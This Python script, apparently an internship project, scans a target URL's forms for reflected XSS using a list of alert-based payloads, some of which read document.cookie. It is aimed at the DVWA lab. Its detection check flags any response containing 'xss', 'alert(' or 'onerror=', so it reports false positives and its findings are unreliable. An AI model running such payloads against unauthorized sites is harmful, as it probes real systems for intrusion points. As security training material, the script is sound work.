"""
SyntecXHub Internship - Project 2: Reflected XSS Scanner 
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import logging

logging.basicConfig(
    filename='xss_scan_results.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)

# Stronger set of XSS payloads for DVWA
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(document.cookie)</script>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<img src=\"x\" onerror=\"alert(1)\">"
]

def scan_url(url):
    print(f"\n[+] Starting XSS scan on: {url}")
    logging.info(f"Starting XSS scan on {url}")

    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        print(f"[+] Found {len(forms)} forms on the page")
    except Exception as e:
        print(f"[-] Could not fetch the page: {e}")
        return

    vulnerable_count = 0

    for form in forms:
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        target_url = urljoin(url, action)

        for payload in XSS_PAYLOADS:
            data = {}
            for input_tag in form.find_all("input"):
                name = input_tag.attrs.get("name")
                if name:
                    data[name] = payload

            try:
                if method == "post":
                    r = requests.post(target_url, data=data, timeout=10)
                else:
                    r = requests.get(target_url, params=data, timeout=10)

                response_text = r.text.lower()

                # Multiple detection methods
                if (payload.lower() in response_text or 
                    "alert(" in response_text or 
                    "xss" in response_text or 
                    "onerror=" in response_text or 
                    "onload=" in response_text):

                    print(f"[!] REFLECTED XSS VULNERABILITY FOUND!")
                    print(f"    URL: {target_url}")
                    print(f"    Payload: {payload}")
                    logging.warning(f"XSS found at {target_url} with payload: {payload}")
                    vulnerable_count += 1
                    time.sleep(1)
                    break   # Move to next form after finding one

            except Exception as e:
                logging.error(f"Request failed for {target_url}: {e}")

    print(f"\n[+] Scan completed. Potential XSS vulnerabilities found: {vulnerable_count}")
    logging.info(f"XSS scan completed. Vulnerabilities: {vulnerable_count}")

if __name__ == "__main__":
    print("=== Reflected XSS Scanner (Improved Detection) ===")
    print("Warning: Only test on authorized targets!")

    target = input("Enter target URL (e.g. http://localhost/vulnerabilities/xss_r/): ").strip()

    if not target.startswith("http"):
        target = "http://" + target

    scan_url(target)

    print("\nScan finished. Check 'xss_scan_results.log' for details.")